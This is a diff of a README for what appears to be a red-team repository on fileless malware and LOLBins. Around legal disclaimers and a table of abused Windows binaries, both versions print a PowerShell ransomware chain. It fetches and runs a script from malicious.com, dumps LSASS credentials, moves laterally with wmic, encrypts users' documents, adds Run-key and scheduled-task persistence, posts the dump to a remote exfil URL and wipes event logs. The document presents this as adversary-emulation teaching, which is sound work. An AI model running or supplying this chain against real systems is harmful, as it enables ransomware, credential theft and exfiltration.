@@ -1,146 +1,161 @@
 
-This repository contains **cybersecurity techniques and tooling** related to:
 
-- Fileless malware simulation
-- Living-Off-the-Land Binaries (LOLBins)
-- Offensive security automation (PrintNightmare, SpoolFool, etc.)
-- Adversary emulation and red/purple team tradecraft
-- Drive-by phishing payload structures
-- GitHub Actions for lab-based CI/CD attacks
+# ⚠️ Advisory & Legal Notice: Educational and Authorized Research Use Only
 
-> This content is provided **strictly for educational and academic purposes** in **controlled environments** such as:
+This repository presents **advanced cybersecurity simulation tools and techniques**, primarily intended for:
+
+- Fileless malware behavior emulation  
+- Living-off-the-Land Binaries (LOLBins) abuse scenarios  
+- Offensive security automation (e.g., PrintNightmare, SpoolFool)  
+- Adversary emulation within red/purple team operations  
+- Drive-by payload structures and phishing simulation  
+- CI/CD exploitation via GitHub Actions in lab environments  
+
+> **This repository is strictly for research, education, and authorized simulation use.**  
+> All materials are to be used exclusively within the following environments:
+> 
 > - Cybersecurity research labs  
-> - Purple/Red Team testing frameworks  
-> - Cyber range simulations  
-> - Adversary emulation for SOC validation  
-> - Blue Team training and response testing  
-
-### 🧪 Lab Use Only
-
-This repository and its payloads are designed to **emulate real-world attack behavior** for use in **safe, isolated, and authorized environments only**.  
-**Do not deploy** any component of this repository on public-facing systems, third-party infrastructure, or any network you do not own or explicitly have written permission to test.
-
-### ❌ Unauthorized Usage is Prohibited
-
-- This repository must **not be used for malicious purposes**.
-- **Misuse of this code or techniques may violate local, national, and international laws**.
-- The maintainers of this repository are **not responsible for any misuse** or damage caused by replicating these examples outside of ethical research or sanctioned testing environments.
-
-### ✅ You Accept Full Responsibility
-
-By cloning, forking, or executing any content from this repository, you **agree to use it only for legal, ethical, and educational purposes**. You assume all responsibility for compliance with applicable laws, regulations, and policies.
+> - Adversary emulation platforms and red/purple team frameworks  
+> - SOC detection validation via cyber ranges  
+> - Blue Team response exercises  
+> - Controlled malware analysis environments  
 
 ---
 
-**If you're unsure whether your use case qualifies as authorized, don't proceed. Consult your legal/compliance team or security leadership.**
+## 🧪 For Lab-Based Simulation Only
 
-—
+This repository is intended to **simulate real-world adversarial behavior** under **isolated, controlled, and authorized conditions only**.  
+Deployment on production systems, third-party networks, or any environment without **explicit, written authorization** is strictly prohibited.
 
 ---
 
-## 🧠 NSFW - Fileless Malware 
+## ❌ Unauthorized Usage Prohibited
+
+- This content must **never** be used for malicious, unlawful, or unethical purposes.  
+- **Misuse may violate international, federal, or local cybersecurity laws.**  
+- Authors and contributors assume **no liability** for any damage or legal consequences resulting from misuse or improper replication of this content.
+
+---
+
+## ✅ Usage Agreement
+
+By accessing, cloning, or executing this repository, you agree to the following:
+
+- You will use this content **only in compliance** with applicable laws, regulations, and institutional security policies.  
+- You accept **full responsibility** for the outcomes and legal implications of your usage.  
+- You are authorized to conduct security testing in your target environment or have written permission to do so.
+
+---
+
+**⚖️ Unsure whether your use is authorized? Do not proceed.  
+Consult your organization's legal, compliance, or security leadership before using this repository.**
+
+---
+
+## 🧠 NSFW – Advanced Fileless Malware Emulation
 
 ![Fileless Malware Concept](https://github.com/user-attachments/assets/3108f067-a49b-45c1-b1c4-07691881c76b)
 
 ---
 
-## 🧩 LOLBins 101: Living off the Land Binaries & Scripts
+## 🧩 LOLBins 101: Living-Off-the-Land Binaries & Scripts
 
-**LOLBins** (Living off the Land Binaries) are legitimate Windows system utilities that adversaries repurpose to execute code, evade defenses, and persist. These tools are trusted, signed, and often overlooked by endpoint security solutions.
+**LOLBins** are legitimate system tools native to Windows environments that can be weaponized by adversaries to execute arbitrary code, establish persistence, and evade detection.
 
-### ⚙️ Common LOLBins and Their Abuse Cases
+### ⚙️ Commonly Abused LOLBins
 
-| LOLBin              | Abused For                       | ATT&CK Tactics                          |
-|---------------------|----------------------------------|-----------------------------------------|
-| `rundll32.exe`      | DLL execution                    | Code execution, EDR bypass              |
-| `mshta.exe`         | Run HTA payloads                 | Script execution, sandbox evasion       |
-| `regsvr32.exe`      | Load COM DLLs                    | Fileless execution, C2 proxy            |
-| `wmic.exe`          | Remote command execution         | Process launch, lateral movement        |
-| `cmd.exe / powershell.exe` | Script runners          | Payload staging, persistence            |
-| `msbuild.exe`       | Inline C# compile/exec           | Fileless malware loading                |
-| `certutil.exe`      | Download/decode files            | Exfiltration, staging                   |
-| `bitsadmin.exe`     | Remote file fetch                | Delivery, task persistence              |
-| `schtasks.exe`      | Task scheduling                  | Privilege escalation, persistence       |
-| `esentutl.exe`      | Copy/exec binary payloads        | Stealth operations, exfiltration        |
+| Binary               | Primary Abuse Vector             | Related MITRE Tactics                  |
+|----------------------|----------------------------------|----------------------------------------|
+| `rundll32.exe`       | Reflective DLL execution         | Execution, Defense Evasion             |
+| `mshta.exe`          | HTA script execution             | Obfuscation, Sandbox Evasion           |
+| `regsvr32.exe`       | COM object loading               | Fileless Execution, C2 Communication   |
+| `wmic.exe`           | Remote command execution         | Lateral Movement, Discovery            |
+| `cmd.exe / powershell.exe` | Script execution          | Payload Staging, Persistence           |
+| `msbuild.exe`        | Runtime C# compilation           | Fileless Malware Deployment            |
+| `certutil.exe`       | File download/decode             | Staging, Exfiltration                  |
+| `bitsadmin.exe`      | Background file transfers         | Task Persistence, Delivery             |
+| `schtasks.exe`       | Scheduled task creation          | Privilege Escalation, Persistence      |
+| `esentutl.exe`       | Arbitrary binary copying         | Covert Execution, Exfiltration         |
 
 ---
 
-## 🧬 Theoretical Simulation: 100% Fileless Ransomware  
-*Using the [MITRE ATT&CK](https://attack.mitre.org/) Framework for Mapping TTPs*
+## 🧬 Simulation: 100% Fileless Ransomware Chain  
+*Mapped using the [MITRE ATT&CK Framework](https://attack.mitre.org/)*
 
-> ⚠️ **Disclaimer**: Code below is a synthetic simulation script intended for red team R&D under proper authorization. DO NOT EXECUTE OUTSIDE OF A SANDBOX ENVIRONMENT.
+> ⚠️ **Legal Disclaimer**: The following simulation script is a **synthetic red team emulation sample** and **must not be executed outside of a properly sandboxed or isolated testing environment**.
 
 <details>
-<summary>Click to view simulated PowerShell ransomware chain</summary>
+<summary>Click to view simulated PowerShell ransomware TTP chain</summary>
 
 ```powershell
-# 🎯 1. Initial Access (T1190)
+# 🎯 Initial Access (T1190)
 $payloadUrl = "http://malicious.com/dropper.ps1"
 IEX(New-Object Net.WebClient).DownloadString($payloadUrl)
 
-# ⚡ 2. Execution (T1059.001)
+# ⚡ Execution (T1059.001)
 $encPayload = "[Base64-Encoded Payload]"
 $decodedPayload = [System.Convert]::FromBase64String($encPayload)
 [System.Reflection.Assembly]::Load($decodedPayload)
 
-# 🔓 3. Privilege Escalation (T1548)
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs
+# 🔓 Privilege Escalation (T1548)
+Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File elevate.ps1" -Verb RunAs
 
-# 🧪 4. Credential Access (T1003.001)
-Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"
+# 🧪 Credential Access (T1003.001)
+Invoke-Expression "rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id dump.dmp full"
 
-# 🔍 5. Discovery (T1082)
-$sysInfo = Get-WmiObject Win32_ComputerSystem | Select Manufacturer, Model, Name, Domain, UserName
-$networkInfo = Get-NetAdapter | Select Name, MacAddress, Status
-Write-Output $sysInfo; Write-Output $networkInfo
+# 🔍 Discovery (T1082)
+Get-WmiObject Win32_ComputerSystem | Select Name, Domain, UserName
+Get-NetAdapter | Select Name, MacAddress
 
-# 🌐 6. Lateral Movement (T1021.001)
-cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"
+# 🌐 Lateral Movement (T1021.001)
+wmic /node:targetPC process call create "powershell -File payload.ps1"
 
-# 💣 7. Impact: File Encryption (T1486)
-$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
-foreach ($file in $targetFiles) {
-    $content = Get-Content $file.FullName -Raw
-    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
+# 💣 Impact: File Encryption (T1486)
+$files = Get-ChildItem "C:\Users\*\Documents" -Include *.txt,*.docx -Recurse
+foreach ($f in $files) {
+    $data = Get-Content $f.FullName -Raw
+    $key = (1..32 | ForEach { [char](Get-Random -Min 65 -Max 90) }) -join ''
     $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
+    $aes.Key = [Text.Encoding]::UTF8.GetBytes($key.PadRight(32,'X'))
     $aes.IV = New-Object byte[] 16
-    $encryptor = $aes.CreateEncryptor()
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
-    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
-    Set-Content -Path $file.FullName -Value $encryptedContent
+    $enc = $aes.CreateEncryptor()
+    $bytes = [Text.Encoding]::UTF8.GetBytes($data)
+    $encData = [Convert]::ToBase64String($enc.TransformFinalBlock($bytes,0,$bytes.Length))
+    Set-Content -Path $f.FullName -Value $encData
 }
 
-# 📌 8. Persistence (T1547.001)
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1"
-schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest
+# 📌 Persistence (T1547.001)
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -File persist.ps1"
+schtasks /create /tn "UpdaterTask" /tr "powershell -File persist.ps1" /sc onlogon /rl highest
 
-# 📤 9. Exfiltration (T1041)
-$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
-Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData
+# 📤 Exfiltration (T1041)
+$exfil = [Convert]::ToBase64String([IO.File]::ReadAllBytes("dump.dmp"))
+Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfil
 
-# 🧹 10. Defense Evasion (T1070)
-Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
+# 🧹 Defense Evasion (T1070)
+Remove-Item C:\Windows\Temp\* -Recurse -Force
 wevtutil cl System; wevtutil cl Security; wevtutil cl Application
-cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
 ```
 
 </details>
 
 ---
 
-## 🧭 Additional Resources
+## 🔗 Recommended Resources & Tools
 
-- 🔧 [PrintNightmare Deep Dive](https://itm4n.github.io/printnightmare-not-over/)
-- 💀 [PrintNightmare Vulnerability Summary](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)
-- 🛠️ [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
-- 🧠 [MITRE ATT&CK Entry - S0697](https://attack.mitre.org/techniques/T1218/)
-- 🧬 [LOLGEN - Generate Abuse Chains](https://lolgen.hdks.org/)
-- 🦠 [Fileless Malware – Wikipedia Overview](https://en.wikipedia.org/wiki/Fileless_malware)
-- 🔗 [DLL Injection Reference](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
-- 🖨️ [Printer Driver Exploits](https://github.com/jacob-baines/concealed_position)
+- [PrintNightmare – Exploit Analysis](https://itm4n.github.io/printnightmare-not-over/)  
+- [Printer Spooler Vulnerability Summary](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)  
+- [LOLOL Farm – LOLBin Sandbox](https://lolol.farm/)  
+- [MITRE ATT&CK - T1218 Reference](https://attack.mitre.org/techniques/T1218/)  
+- [LOLGEN – Chain Generator](https://lolgen.hdks.org/)  
+- [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)  
+- [DLL Injection Techniques](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)  
+- [Printer Exploitation Toolkit](https://github.com/jacob-baines/concealed_position)
 
 ---
 
-### 🛡️ Final Note
-This repository is a research artifact intended for cybersecurity professionals, malware analysts, and red team operators. Unauthorized use, real-world deployment, or replication of these techniques is prohibited. Always operate within the bounds of your local laws and professional codes of conduct.
+### 🛡️ Closing Statement
+
+This repository is a **research artifact** intended solely for use by cybersecurity professionals, red team operators, and academic researchers.  
+Use is governed by your local and international laws, organizational policies, and ethical standards. Unauthorized use or replication of these techniques in real-world systems is **strictly prohibited**.
+
